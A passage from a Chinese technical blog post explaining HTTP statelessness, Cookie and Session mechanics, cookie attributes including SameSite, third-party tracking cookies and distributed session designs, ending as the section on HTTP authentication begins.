<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web 会话与身份认证全景 | 守株阁</title><meta name="author" content="magicliang"><meta name="copyright" content="magicliang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web 会话与身份认证全景 HTTP 协议是无状态的（RFC 7230 §2.3）。每一次请求对服务器而言都是全新的，服务器不会记住上一次请求来自谁。这个设计简化了协议本身，却把&quot;如何记住用户&quot;的问题留给了应用层。 围绕这个核心问题，衍生出一条完整的技术问题链： 1记住用户 → 安全地记住 → 跨系统记住 → 授权第三方 → 浏览器隔离 → 攻击与防护 本文沿着这条问题链，从会">
<meta property="og:type" content="article">
<meta property="og:title" content="Web 会话与身份认证全景">
<meta property="og:url" content="https://magicliang.github.io/2025/07/03/Web-%E4%BC%9A%E8%AF%9D%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%85%A8%E6%99%AF/index.html">
<meta property="og:site_name" content="守株阁">
<meta property="og:description" content="Web 会话与身份认证全景 HTTP 协议是无状态的（RFC 7230 §2.3）。每一次请求对服务器而言都是全新的，服务器不会记住上一次请求来自谁。这个设计简化了协议本身，却把&quot;如何记住用户&quot;的问题留给了应用层。 围绕这个核心问题，衍生出一条完整的技术问题链： 1记住用户 → 安全地记住 → 跨系统记住 → 授权第三方 → 浏览器隔离 → 攻击与防护 本文沿着这条问题链，从会">
<meta property="og:locale">
<meta property="og:image" content="https://magicliang.github.io/img/wall-paper-2.jpg">
<meta property="article:published_time" content="2025-07-03T07:39:51.000Z">
<meta property="article:modified_time" content="2026-02-10T13:23:59.822Z">
<meta property="article:author" content="magicliang">
<meta property="article:tag" content="CORS">
<meta property="article:tag" content="CSP">
<meta property="article:tag" content="CSRF">
<meta property="article:tag" content="Cookie">
<meta property="article:tag" content="JWT">
<meta property="article:tag" content="OAuth">
<meta property="article:tag" content="SSO">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="Session">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="XSS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://magicliang.github.io/img/wall-paper-2.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Web 会话与身份认证全景",
  "url": "https://magicliang.github.io/2025/07/03/Web-%E4%BC%9A%E8%AF%9D%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%85%A8%E6%99%AF/",
  "image": "https://magicliang.github.io/img/wall-paper-2.jpg",
  "datePublished": "2025-07-03T07:39:51.000Z",
  "dateModified": "2026-02-10T13:23:59.822Z",
  "author": [
    {
      "@type": "Person",
      "name": "magicliang",
      "url": "https://magicliang.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://magicliang.github.io/2025/07/03/Web-%E4%BC%9A%E8%AF%9D%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%85%A8%E6%99%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":50,"languages":{"author":"Author: magicliang","link":"Link: ","source":"Source: 守株阁","info":"Copyright belongs to the author. For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source."}},
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Web 会话与身份认证全景',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="守株阁" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/wall-paper-2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">守株阁</span></a><a class="nav-page-title" href="/"><span class="site-name">Web 会话与身份认证全景</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Web 会话与身份认证全景</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-03T07:39:51.000Z" title="Created 2025-07-03 15:39:51">2025-07-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-10T13:23:59.822Z" title="Updated 2026-02-10 21:23:59">2026-02-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web-Security/">Web Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">11.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>47mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>Web 会话与身份认证全景</h1>
<p>HTTP 协议是无状态的（RFC 7230 §2.3）。每一次请求对服务器而言都是全新的，服务器不会记住上一次请求来自谁。这个设计简化了协议本身，却把&quot;如何记住用户&quot;的问题留给了应用层。</p>
<p>围绕这个核心问题，衍生出一条完整的技术问题链：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">记住用户 → 安全地记住 → 跨系统记住 → 授权第三方 → 浏览器隔离 → 攻击与防护<br></code></pre></td></tr></table></figure>
<p>本文沿着这条问题链，从会话管理到身份认证，从安全边界到攻防实战，构建一幅完整的技术全景图。</p>
<h2 id="全景问题链">全景问题链</h2>
<pre><code class="hljs mermaid">graph TD
    A[&quot;HTTP 无状态&lt;br/&gt;RFC 7230&quot;] --&gt;|&quot;问题：如何记住用户？&quot;| B[&quot;会话管理&lt;br/&gt;Cookie + Session&quot;]
    B --&gt;|&quot;问题：单机 Session 如何扩展？&quot;| C[&quot;分布式 Session&lt;br/&gt;复制 / 粘性 / 集中存储&quot;]
    C --&gt;|&quot;问题：服务端能否不存状态？&quot;| D[&quot;JWT&lt;br/&gt;签名防篡改&lt;br/&gt;自包含无状态&quot;]
    B --&gt;|&quot;问题：HTTP 层如何传递凭证？&quot;| E[&quot;HTTP 认证&lt;br/&gt;Basic → Digest → Bearer&quot;]
    D --&gt;|&quot;问题：如何跨系统免登录？&quot;| F[&quot;SSO 单点登录&lt;br/&gt;CAS 协议&quot;]
    F --&gt;|&quot;问题：如何安全授权第三方？&quot;| G[&quot;OAuth 2.0&lt;br/&gt;授权码模式&quot;]
    B --&gt;|&quot;问题：浏览器如何隔离不同站点？&quot;| H[&quot;同源策略&lt;br/&gt;CORS / JSONP&quot;]
    H --&gt;|&quot;问题：攻击者如何突破隔离？&quot;| I[&quot;XSS 偷内容&lt;br/&gt;CSRF 借身份&lt;br/&gt;SSRF 借网络&quot;]
    I --&gt;|&quot;问题：如何从浏览器层面兜底？&quot;| J[&quot;CSP&lt;br/&gt;内容安全策略&quot;]

    style A fill:#f9f9f9,stroke:#333
    style B fill:#e6f3ff,stroke:#333
    style C fill:#e6f3ff,stroke:#333
    style D fill:#e6f3ff,stroke:#333
    style E fill:#fff3e6,stroke:#333
    style F fill:#fff3e6,stroke:#333
    style G fill:#fff3e6,stroke:#333
    style H fill:#e6ffe6,stroke:#333
    style I fill:#ffe6e6,stroke:#333
    style J fill:#ffe6e6,stroke:#333</code></pre>
<h2 id="模式总览">模式总览</h2>
<table>
<thead>
<tr>
<th>问题</th>
<th>模式</th>
<th>口诀</th>
<th>覆盖章节</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP 无状态，如何记住用户？</td>
<td>载体 + 服务端存储</td>
<td>Cookie 传 ID，Session 存数据</td>
<td>Part 1</td>
</tr>
<tr>
<td>Cookie 如何安全传输？</td>
<td>六大属性三开关</td>
<td>域路径定范围，过期定寿命，三开关定安全</td>
<td>Part 1</td>
</tr>
<tr>
<td>单机 Session 如何扩展？</td>
<td>集中存储 + 无状态令牌</td>
<td>存 Redis 或签 JWT</td>
<td>Part 1</td>
</tr>
<tr>
<td>HTTP 层如何传递凭证？</td>
<td>认证头 + 质询-响应</td>
<td>Basic 明文，Digest 哈希，Bearer 令牌</td>
<td>Part 2</td>
</tr>
<tr>
<td>服务端能否不存状态？</td>
<td>自包含令牌</td>
<td>签名防篡改，过期防滥用，签出去收不回来</td>
<td>Part 2</td>
</tr>
<tr>
<td>如何跨系统免登录？</td>
<td>中心化认证 + Ticket</td>
<td>没 Cookie 就跳转，有 Cookie 就放行，Ticket 用完即焚</td>
<td>Part 2</td>
</tr>
<tr>
<td>如何安全授权第三方？</td>
<td>授权码 + Token 分离</td>
<td>前端拿 Code，后端换 Token，Code 用完即焚</td>
<td>Part 2</td>
</tr>
<tr>
<td>浏览器如何隔离不同站点？</td>
<td>同源策略 + 白名单</td>
<td>协议域名端口三元组</td>
<td>Part 3</td>
</tr>
<tr>
<td>攻击者如何突破隔离？</td>
<td>注入 / 借身份 / 借网络</td>
<td>XSS 偷，CSRF 借，SSRF 穿</td>
<td>Part 4</td>
</tr>
<tr>
<td>如何从浏览器层面兜底？</td>
<td>资源加载白名单</td>
<td>脚本管 XSS，frame 管劫持，connect 管外泄</td>
<td>Part 4</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="part-1：会话管理-如何记住用户？">Part 1：会话管理——如何记住用户？</h2>
<blockquote>
<p><strong>核心问题</strong>：HTTP 无状态，服务器如何在多次请求间识别同一个用户？</p>
</blockquote>
<h3 id="会话管理基础">会话管理基础</h3>
<h4 id="三种会话-id-载体">三种会话 ID 载体</h4>
<p>HTTP 协议本身不维护状态，因此需要在应用层引入&quot;会话&quot;（Session）的概念。会话的本质是：<strong>客户端携带一个标识符（Session ID），服务端根据这个标识符查找对应的用户状态</strong>。</p>
<p>Session ID 的传递有三种载体：</p>
<table>
<thead>
<tr>
<th>载体</th>
<th>机制</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Cookie</strong></td>
<td>浏览器自动在请求头中携带</td>
<td>透明、自动、标准化</td>
<td>受同源策略限制，可被禁用</td>
</tr>
<tr>
<td><strong>URL 重写</strong></td>
<td>将 Session ID 附加到 URL 参数中</td>
<td>不依赖 Cookie</td>
<td>URL 暴露 Session ID，易泄露</td>
</tr>
<tr>
<td><strong>隐藏表单字段</strong></td>
<td>在 HTML 表单中嵌入隐藏的 Session ID</td>
<td>不依赖 Cookie</td>
<td>仅适用于表单提交场景</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>记忆锚点：Cookie 传 ID，Session 存数据，URL 和表单是备选。</strong></p>
</blockquote>
<h4 id="cookie-session-工作流程">Cookie-Session 工作流程</h4>
<pre><code class="hljs mermaid">sequenceDiagram
    participant B as 浏览器
    participant S as 服务器

    B-&gt;&gt;S: 首次请求（无 Cookie）
    S-&gt;&gt;S: 创建 Session 对象&lt;br/&gt;生成 Session ID（如 UUID）&lt;br/&gt;存入内存/Redis
    S--&gt;&gt;B: 响应 + Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly
    Note over B: 浏览器存储 Cookie

    B-&gt;&gt;S: 后续请求&lt;br/&gt;Cookie: JSESSIONID=abc123
    S-&gt;&gt;S: 根据 abc123 查找 Session&lt;br/&gt;恢复用户状态
    S--&gt;&gt;B: 响应（已认证）

    Note over B,S: Session 过期或用户登出
    B-&gt;&gt;S: 请求（携带过期 Session ID）
    S-&gt;&gt;S: 查找 Session 失败
    S--&gt;&gt;B: 401 Unauthorized 或重定向到登录页</code></pre>
<h4 id="tomcat-session-实现">Tomcat Session 实现</h4>
<p>Tomcat 的 Session 管理体现了典型的容器级实现。其四层结构为：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Server</span> → Service → Engine → Host → Context（应用）→ Manager → <span class="hljs-keyword">Session</span><br></code></pre></td></tr></table></figure>
<p><img src="tomcat%E5%9B%9B%E5%B1%82%E7%BB%93%E6%9E%84.png" alt="Tomcat 四层结构"></p>
<p>每个 Web 应用（Context）拥有独立的 <code>Manager</code>，负责 Session 的创建、查找和销毁。默认的 <code>StandardManager</code> 将 Session 存储在内存中，并支持持久化到文件系统。</p>
<p><img src="StandardManager%E7%B1%BB%E5%9B%BE.png" alt="StandardManager 类图"></p>
<p><img src="tomcat-session%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="Tomcat Session 的结构"></p>
<h3 id="cookie-深入解析">Cookie 深入解析</h3>
<blockquote>
<p><strong>核心问题</strong>：Cookie 作为最主要的会话 ID 载体，如何控制其作用范围和安全性？</p>
</blockquote>
<p>Cookie 由 RFC 6265（HTTP State Management Mechanism）定义，是浏览器端存储少量数据的标准机制。每个 Cookie 由六大属性控制其行为。</p>
<h4 id="六大属性">六大属性</h4>
<table>
<thead>
<tr>
<th>属性</th>
<th>作用</th>
<th>默认值</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Domain</strong></td>
<td>指定 Cookie 的作用域名</td>
<td>当前域名（不含子域）</td>
<td><code>Domain=.example.com</code>（含子域）</td>
</tr>
<tr>
<td><strong>Path</strong></td>
<td>指定 Cookie 的作用路径</td>
<td>当前路径</td>
<td><code>Path=/api</code></td>
</tr>
<tr>
<td><strong>Expires</strong></td>
<td>绝对过期时间</td>
<td>不设置 = 会话 Cookie</td>
<td><code>Expires=Thu, 01 Jan 2026 00:00:00 GMT</code></td>
</tr>
<tr>
<td><strong>Max-Age</strong></td>
<td>相对过期时间（秒）</td>
<td>不设置 = 会话 Cookie</td>
<td><code>Max-Age=3600</code>（1 小时）</td>
</tr>
<tr>
<td><strong>Secure</strong></td>
<td>仅通过 HTTPS 传输</td>
<td>不设置 = HTTP/HTTPS 均可</td>
<td><code>Secure</code></td>
</tr>
<tr>
<td><strong>HttpOnly</strong></td>
<td>禁止 JavaScript 访问</td>
<td>不设置 = JS 可访问</td>
<td><code>HttpOnly</code></td>
</tr>
</tbody>
</table>
<p>会话 Cookie（Session Cookie）指未设置 <code>Expires</code> 或 <code>Max-Age</code> 的 Cookie，浏览器关闭即销毁。</p>
<p><strong>Expires vs Max-Age 优先级</strong>：当两者同时存在时，<code>Max-Age</code> 优先（RFC 6265 §5.3）。<code>Max-Age=0</code> 表示立即删除 Cookie。</p>
<h4 id="domain-匹配规则">Domain 匹配规则</h4>
<p>Domain 属性控制 Cookie 的作用域名，其匹配规则有细微差异：</p>
<table>
<thead>
<tr>
<th>设置方式</th>
<th>匹配范围</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>不设置 Domain</td>
<td>仅当前域名（精确匹配，不含子域）</td>
<td>仅 <code>www.example.com</code></td>
</tr>
<tr>
<td><code>Domain=example.com</code></td>
<td>当前域名 + 所有子域</td>
<td><code>example.com</code>、<code>www.example.com</code>、<code>api.example.com</code></td>
</tr>
<tr>
<td><code>Domain=.example.com</code></td>
<td>同上（前导点被忽略，RFC 6265）</td>
<td>同上</td>
</tr>
</tbody>
</table>
<p><strong>安全注意</strong>：设置 <code>Domain=example.com</code> 意味着所有子域都能读取该 Cookie。如果子域中存在不受信任的应用，可能导致 Cookie 泄露。</p>
<h4 id="path-匹配规则">Path 匹配规则</h4>
<p>Path 属性采用<strong>前缀匹配</strong>：</p>
<table>
<thead>
<tr>
<th>设置</th>
<th>匹配的路径</th>
<th>不匹配的路径</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Path=/</code></td>
<td>所有路径</td>
<td>无</td>
</tr>
<tr>
<td><code>Path=/api</code></td>
<td><code>/api</code>、<code>/api/users</code>、<code>/api/v2/data</code></td>
<td><code>/app</code>、<code>/application</code></td>
</tr>
<tr>
<td><code>Path=/api/</code></td>
<td><code>/api/</code>、<code>/api/users</code></td>
<td><code>/api</code>（无尾部斜杠）</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>记忆锚点：域路径定范围，过期定寿命，Secure 管传输，HttpOnly 管脚本。Max-Age 优先于 Expires。</strong></p>
</blockquote>
<h4 id="完整-set-cookie-示例">完整 Set-Cookie 示例</h4>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>session_id=abc123;<br>  Domain=.example.com;<br>  Path=/;<br>  Max-Age=3600;<br>  Expires=Thu, 01 Jan 2026 00:00:00 GMT;<br>  Secure;<br>  HttpOnly;<br>  SameSite=Lax<br></code></pre></td></tr></table></figure>
<h4 id="samesite-属性">SameSite 属性</h4>
<p>SameSite 是 Cookie 的第七个属性（RFC 6265bis），用于防御 CSRF 攻击。它控制 Cookie 在跨站请求中是否被发送：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>行为</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Strict</strong></td>
<td>跨站请求完全不发送 Cookie</td>
<td>银行、支付等高安全场景</td>
</tr>
<tr>
<td><strong>Lax</strong>（默认）</td>
<td>顶级导航的 GET 请求发送，其他跨站请求不发送</td>
<td>大多数 Web 应用</td>
</tr>
<tr>
<td><strong>None</strong></td>
<td>跨站请求也发送（必须配合 <code>Secure</code>）</td>
<td>需要跨站嵌入的第三方服务</td>
</tr>
</tbody>
</table>
<pre><code class="hljs mermaid">graph TD
    A[&quot;用户在 evil.com&lt;br/&gt;点击链接到 bank.com&quot;] --&gt; B&#123;&quot;SameSite 值？&quot;&#125;
    B --&gt;|&quot;Strict&quot;| C[&quot;不发送 Cookie&lt;br/&gt;用户需重新登录&quot;]
    B --&gt;|&quot;Lax&quot;| D[&quot;GET 导航发送 Cookie&lt;br/&gt;POST/iframe 不发送&quot;]
    B --&gt;|&quot;None + Secure&quot;| E[&quot;发送 Cookie&lt;br/&gt;需 HTTPS&quot;]

    style C fill:#ffe6e6
    style D fill:#fff3e6
    style E fill:#e6ffe6</code></pre>
<blockquote>
<p><strong>记忆锚点：Strict 最严跨站全禁，Lax 折中只放 GET 导航，None 全放但必须 HTTPS。</strong></p>
</blockquote>
<h4 id="第三方-cookie-与隐私">第三方 Cookie 与隐私</h4>
<p>第三方 Cookie 指由非当前页面域名设置的 Cookie。典型场景是广告追踪：</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户
    participant A as site-a.com
    participant T as tracker.com
    participant B as site-b.com

    U-&gt;&gt;A: 访问 site-a.com
    A--&gt;&gt;U: 页面包含 &lt;img src=&quot;tracker.com/pixel.gif&quot;&gt;
    U-&gt;&gt;T: 请求 tracker.com/pixel.gif
    T--&gt;&gt;U: Set-Cookie: uid=12345; Domain=tracker.com

    U-&gt;&gt;B: 访问 site-b.com
    B--&gt;&gt;U: 页面也包含 &lt;img src=&quot;tracker.com/pixel.gif&quot;&gt;
    U-&gt;&gt;T: 请求 tracker.com/pixel.gif&lt;br/&gt;Cookie: uid=12345
    T-&gt;&gt;T: 关联用户在 site-a 和 site-b 的行为</code></pre>
<p>主流浏览器正在逐步限制第三方 Cookie：</p>
<ul>
<li><strong>Safari</strong>：ITP（Intelligent Tracking Prevention）已默认阻止第三方 Cookie</li>
<li><strong>Firefox</strong>：ETP（Enhanced Tracking Protection）默认阻止已知追踪器的第三方 Cookie</li>
<li><strong>Chrome</strong>：计划通过 Privacy Sandbox 替代第三方 Cookie</li>
</ul>
<h3 id="分布式-session-方案">分布式 Session 方案</h3>
<blockquote>
<p><strong>核心问题</strong>：单机 Session 存储在内存中，当应用部署多个实例时，用户请求可能被路由到不同实例，导致 Session 丢失。如何解决？</p>
</blockquote>
<h4 id="四种方案对比">四种方案对比</h4>
<table>
<thead>
<tr>
<th>方案</th>
<th>原理</th>
<th>优点</th>
<th>缺点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Session 复制</strong></td>
<td>各节点间同步 Session 数据</td>
<td>实现简单</td>
<td>网络开销大，节点越多越慢</td>
<td>小规模集群（2-4 节点）</td>
</tr>
<tr>
<td><strong>粘性 Session</strong></td>
<td>负载均衡器将同一用户路由到同一节点</td>
<td>无需改造应用</td>
<td>节点宕机则 Session 丢失</td>
<td>对可用性要求不高的场景</td>
</tr>
<tr>
<td><strong>集中存储</strong></td>
<td>Session 存入 Redis/数据库等共享存储</td>
<td>高可用、可扩展</td>
<td>增加外部依赖和网络延迟</td>
<td>生产环境首选</td>
</tr>
<tr>
<td><strong>客户端存储（JWT）</strong></td>
<td>将状态编码到 Token 中，客户端持有</td>
<td>服务端完全无状态</td>
<td>Token 体积大，无法主动撤销</td>
<td>微服务、API 场景</td>
</tr>
</tbody>
</table>
<h4 id="session-复制的网络风暴">Session 复制的网络风暴</h4>
<pre><code class="hljs mermaid">graph TD
    subgraph &quot;3 节点集群&quot;
        N1[&quot;节点 1&lt;br/&gt;Session A 更新&quot;]
        N2[&quot;节点 2&quot;]
        N3[&quot;节点 3&quot;]
    end

    N1 --&gt;|&quot;同步 Session A&quot;| N2
    N1 --&gt;|&quot;同步 Session A&quot;| N3
    N2 --&gt;|&quot;确认&quot;| N1
    N3 --&gt;|&quot;确认&quot;| N1

    subgraph &quot;N 节点集群&quot;
        M[&quot;每次更新&lt;br/&gt;需同步 N-1 个节点&lt;br/&gt;网络消息 = O(N^2)&quot;]
    end

    style M fill:#ffe6e6</code></pre>
<h4 id="粘性-session-的故障场景">粘性 Session 的故障场景</h4>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户
    participant LB as 负载均衡器
    participant N1 as 节点 1
    participant N2 as 节点 2

    U-&gt;&gt;LB: 请求 1
    LB-&gt;&gt;N1: 路由到节点 1（基于 IP Hash）
    N1-&gt;&gt;N1: 创建 Session
    N1--&gt;&gt;U: 响应 + Session Cookie

    U-&gt;&gt;LB: 请求 2
    LB-&gt;&gt;N1: 继续路由到节点 1
    N1--&gt;&gt;U: 正常响应

    Note over N1: 节点 1 宕机

    U-&gt;&gt;LB: 请求 3
    LB-&gt;&gt;N2: 路由到节点 2（节点 1 不可用）
    N2-&gt;&gt;N2: 查找 Session 失败
    N2--&gt;&gt;U: 401 需重新登录</code></pre>
<h4 id="集中存储方案-生产环境首选">集中存储方案（生产环境首选）</h4>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户
    participant LB as 负载均衡器
    participant N1 as 节点 1
    participant N2 as 节点 2
    participant R as Redis 集群

    U-&gt;&gt;LB: 请求 1
    LB-&gt;&gt;N1: 路由到节点 1
    N1-&gt;&gt;R: 创建 Session（SET session:abc123 &#123;...&#125;）
    R--&gt;&gt;N1: OK
    N1--&gt;&gt;U: 响应 + Session Cookie

    U-&gt;&gt;LB: 请求 2
    LB-&gt;&gt;N2: 路由到节点 2（不同节点）
    N2-&gt;&gt;R: 查找 Session（GET session:abc123）
    R--&gt;&gt;N2: 返回 Session 数据
    N2--&gt;&gt;U: 正常响应（用户无感知）</code></pre>
<blockquote>
<p><strong>记忆锚点：复制扛不住广播风暴，粘性扛不住节点宕机，Redis 集中存储是生产首选。</strong></p>
</blockquote>
<hr>
<h2 id="part-2：身份认证-如何证明身份？">Part 2：身份认证——如何证明身份？</h2>
<blockquote>
<p><strong>核心问题</strong>：用户声称自己是某人，服务器如何验证这个声明？从 HTTP 协议层的认证头，到应用层的 JWT、SSO、OAuth 2.0，认证技术不断演进。</p>
</blockquote>
<h3 id="http-认证技术演进">HTTP 认证技术演进</h3>
<blockquote>
<p><strong>核心问题</strong>：如何在 HTTP 请求中安全地传递身份凭证？</p>
</blockquote>
<p>HTTP 认证机制定义了客户端和服务器之间的标准质询-响应（Challenge-Response）流程。从最简单的 Basic 认证到现代的 Bearer Token，每一种方案都解决了前一种方案的安全缺陷。</p>
<h4 id="三种认证方案概览">三种认证方案概览</h4>
<pre><code class="hljs mermaid">graph LR
